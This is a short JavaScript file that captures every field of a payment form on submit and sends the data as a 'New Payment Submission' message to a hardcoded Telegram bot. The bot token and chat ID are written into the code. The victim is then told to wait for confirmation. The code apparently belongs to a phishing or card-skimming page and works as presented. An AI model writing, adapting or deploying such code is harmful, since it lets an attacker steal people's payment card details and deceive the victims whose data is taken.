document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form"); // Ensure this targets your actual form

    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Collect form data
        let formData = new FormData(form);
        let message = "💳 *New Payment Submission:*\n";
        
        // Format data as a message
        for (let [key, value] of formData.entries()) {
            message += `🔹 *${key}*: ${value}\n`; // Fix string interpolation
        }

        // Telegram API Details
        const telegramBotToken = "7888571622:AAGbnOl96FtOOPf94Rgl8UmJrRG5pa7nNQU";
        const chatId = "5582611779";
        const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`; // Use backticks for string interpolation

        // Send data to Telegram
        fetch(telegramURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown",
            }),
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("Payment details sent wait for conformation");
                form.reset();
            } else {
                alert("Failed to send details. Try again.");
            }
        })
        .catch(error => console.error("Error:", error));
    });
});
